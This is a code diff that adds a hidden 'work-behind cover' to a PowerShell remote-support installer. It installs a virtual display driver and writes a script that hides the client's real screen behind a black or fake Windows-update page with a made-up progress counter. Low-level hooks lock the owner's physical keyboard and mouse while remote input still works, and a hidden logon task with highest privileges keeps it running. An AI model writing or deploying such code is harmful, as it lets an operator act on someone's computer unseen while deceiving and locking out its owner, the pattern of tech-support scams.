@@ -310,3 +310,114 @@ try {
     Start-Service Rustdesk -EA 0
   }
 } catch {}
+
+# ============================================================
+#  Work-behind cover (virtual display)
+#  Lets you work on a 2nd (virtual) monitor via RustDesk/AnyDesk
+#  while the client's REAL monitor shows a black or fake-update
+#  screen with the client's physical input locked (your remote
+#  input still works). Driver installed here as SYSTEM; the cover
+#  runs in the user session, toggled by the dashboard writing
+#  WORKCOVER.flag (content: black | update).
+# ============================================================
+try {
+  $vdDir = Join-Path $dir 'usbmmidd_v2'
+  $vdDi  = if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') { 'deviceinstaller64' } else { 'deviceinstaller' }
+  if (-not (Test-Path (Join-Path $vdDir 'usbmmidd.inf'))) {
+    try {
+      $vz = Join-Path $dir 'usbmmidd_v2.zip'
+      Invoke-WebRequest 'https://amyuni.com/downloads/usbmmidd_v2.zip' -OutFile $vz -UseBasicParsing
+      Expand-Archive $vz -DestinationPath $dir -Force; Remove-Item $vz -EA 0
+    } catch {}
+  }
+  if ((Test-Path (Join-Path $vdDir 'usbmmidd.inf')) -and -not (Get-PnpDevice -FriendlyName 'USB Mobile Monitor Virtual Display' -EA 0)) {
+    cmd /c "`"$vdDir\$vdDi`" install `"$vdDir\usbmmidd.inf`" usbmmidd" | Out-Null
+  }
+} catch {}
+
+$workCover = @'
+$ErrorActionPreference='SilentlyContinue'
+$dir='C:\ProgramData\RemoteSupport'
+$flag=Join-Path $dir 'WORKCOVER.flag'
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class WLock{
+ const int WH_KEYBOARD_LL=13, WH_MOUSE_LL=14, WM_KEYDOWN=0x100, WM_SYSKEYDOWN=0x104;
+ public delegate IntPtr Proc(int n,IntPtr w,IntPtr l);
+ static IntPtr kH=IntPtr.Zero,mH=IntPtr.Zero; static Proc kP,mP;
+ static bool ctrl=false,alt=false; public static bool RequestUnlock=false;
+ [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id,Proc fn,IntPtr mod,uint tid);
+ [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
+ [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);
+ [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string m);
+ [DllImport("user32.dll")] static extern IntPtr FindWindow(string c,string w);
+ [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr h,int c);
+ [DllImport("user32.dll")] static extern int ShowCursor(bool b);
+ static void Bar(int c){ IntPtr t=FindWindow("Shell_TrayWnd",null); if(t!=IntPtr.Zero)ShowWindow(t,c); IntPtr s=FindWindow("Shell_SecondaryTrayWnd",null); if(s!=IntPtr.Zero)ShowWindow(s,c);}
+ static IntPtr KHook(int n,IntPtr w,IntPtr l){
+  if(n>=0){ int fl=Marshal.ReadInt32(l,8); bool inj=(fl&0x10)!=0; int vk=Marshal.ReadInt32(l,0); int msg=w.ToInt32(); bool down=(msg==WM_KEYDOWN||msg==WM_SYSKEYDOWN);
+   if(vk==0x11||vk==0xA2||vk==0xA3)ctrl=down; if(vk==0x12||vk==0xA4||vk==0xA5)alt=down; if(down&&vk==0x55&&ctrl&&alt){RequestUnlock=true;}
+   if(!inj) return (IntPtr)1; }
+  return CallNextHookEx(IntPtr.Zero,n,w,l);}
+ static IntPtr MHook(int n,IntPtr w,IntPtr l){
+  if(n>=0){ int fl=Marshal.ReadInt32(l,12); bool inj=(fl&0x01)!=0; if(!inj) return (IntPtr)1; }
+  return CallNextHookEx(IntPtr.Zero,n,w,l);}
+ public static void Hook(){ if(kH!=IntPtr.Zero)return; kP=KHook;mP=MHook; IntPtr h=GetModuleHandle(null); kH=SetWindowsHookEx(WH_KEYBOARD_LL,kP,h,0); mH=SetWindowsHookEx(WH_MOUSE_LL,mP,h,0); Bar(0); for(int i=0;i<8&&ShowCursor(false)>=0;i++){} }
+ public static void Unhook(){ for(int i=0;i<8&&ShowCursor(true)<0;i++){} Bar(5); if(kH!=IntPtr.Zero){UnhookWindowsHookEx(kH);kH=IntPtr.Zero;} if(mH!=IntPtr.Zero){UnhookWindowsHookEx(mH);mH=IntPtr.Zero;} RequestUnlock=false;ctrl=false;alt=false; }
+}
+"@
+while($true){
+  if((Test-Path $flag) -and ((((Get-Date)-(Get-Item $flag).LastWriteTime).TotalHours) -lt 3)){
+    $mode=(Get-Content $flag -Raw).Trim().ToLower(); if($mode -ne 'update'){ $mode='black' }
+    if($mode -eq 'update'){ $bg='#006dae' } else { $bg='#000000' }
+    $b=[Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $f=New-Object Windows.Forms.Form; $f.FormBorderStyle='None'; $f.TopMost=$true; $f.StartPosition='Manual'; $f.Bounds=$b; $f.ShowInTaskbar=$false
+    try{ $f.BackColor=[Drawing.ColorTranslator]::FromHtml($bg) }catch{ $f.BackColor='Black' }
+    if($mode -eq 'update'){
+      $html=@"
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><meta http-equiv="Pragma" content="no-cache"><meta http-equiv="Expires" content="0"><style>
+html,body{margin:0;height:100%;background:$bg;overflow:hidden;font-family:'Segoe UI Light','Segoe UI',Tahoma,Arial,sans-serif;cursor:none}
+.c{position:absolute;top:50%;left:50%;transform:translate(-50%,-58%);text-align:center;color:#fff;white-space:nowrap}
+.loader{position:relative;width:50px;height:50px;margin:0 auto 46px}
+.loader .circle{position:absolute;width:48px;height:48px;opacity:0;transform:rotate(225deg);animation-iteration-count:infinite;animation-name:orbit;animation-duration:5.5s}
+.loader .circle:after{content:'';position:absolute;width:6px;height:6px;border-radius:5px;background:#fff}
+.loader .circle:nth-child(2){animation-delay:240ms}
+.loader .circle:nth-child(3){animation-delay:480ms}
+.loader .circle:nth-child(4){animation-delay:720ms}
+.loader .circle:nth-child(5){animation-delay:960ms}
+@keyframes orbit{0%{transform:rotate(225deg);opacity:1;animation-timing-function:ease-out}7%{transform:rotate(345deg);animation-timing-function:linear}30%{transform:rotate(455deg);animation-timing-function:ease-in-out}39%{transform:rotate(690deg);animation-timing-function:linear}70%{transform:rotate(815deg);opacity:1;animation-timing-function:ease-out}75%{transform:rotate(945deg);animation-timing-function:ease-out}76%{transform:rotate(945deg);opacity:0}100%{transform:rotate(945deg);opacity:0}}
+.t{font-size:23px;font-weight:400}.s{font-size:15px;margin-top:16px}
+.b{position:fixed;bottom:11%;left:0;width:100%;text-align:center;font-size:15px;color:#fff}
+</style></head><body><div class="c">
+<div class="loader"><div class="circle"></div><div class="circle"></div><div class="circle"></div><div class="circle"></div><div class="circle"></div></div>
+<div class="t">Working on updates <span id="p">0</span>% complete</div>
+<div class="s">Don't turn off your PC. This will take a while.</div>
+</div><div class="b">Your PC will restart several times</div>
+<script>var p=0,el=document.getElementById('p');function step(){if(p<100){var j=Math.random();if(j<0.55){p+=1;}else if(j<0.85){p+=Math.floor(Math.random()*4)+2;}if(p>100)p=100;el.innerHTML=p;}setTimeout(step,1200+Math.random()*6000);}setTimeout(step,1500);</script>
+</body></html>
+"@
+      $hp=Join-Path $dir ('wcover_'+[DateTime]::Now.Ticks+'.html')
+      Get-ChildItem $dir -Filter 'wcover_*.html' -EA 0 | Remove-Item -Force -EA 0
+      Set-Content $hp $html -Encoding UTF8
+      $wb=New-Object Windows.Forms.WebBrowser; $wb.Dock='Fill'; $wb.ScrollBarsEnabled=$false; $wb.IsWebBrowserContextMenuEnabled=$false; $wb.WebBrowserShortcutsEnabled=$false; $wb.AllowWebBrowserDrop=$false
+      $wb.Url=[Uri]('file:///'+($hp -replace '\\','/'))
+      $f.Controls.Add($wb)
+    }
+    $script:wf=$f
+    $tm=New-Object Windows.Forms.Timer; $tm.Interval=250
+    $tm.Add_Tick({ if((-not (Test-Path $flag)) -or ([WLock]::RequestUnlock)){ $script:wf.Close() } })
+    $tm.Start()
+    [WLock]::Hook(); [void]$f.ShowDialog(); [WLock]::Unhook(); $tm.Stop()
+  }
+  Start-Sleep -Milliseconds 250
+}
+'@
+Set-Content -Path (Join-Path $dir 'workcover.ps1') -Value $workCover -Encoding UTF8
+$wuser = (Get-CimInstance Win32_ComputerSystem).UserName
+$wtr = 'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\RemoteSupport\workcover.ps1'
+if ($wuser) { schtasks /create /tn RemoteSupportWorkCover /tr "$wtr" /sc onlogon /ru "$wuser" /rl HIGHEST /it /f | Out-Null }
+Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -EA 0 | Where-Object { $_.CommandLine -like '*workcover.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }
+schtasks /run /tn RemoteSupportWorkCover *>$null
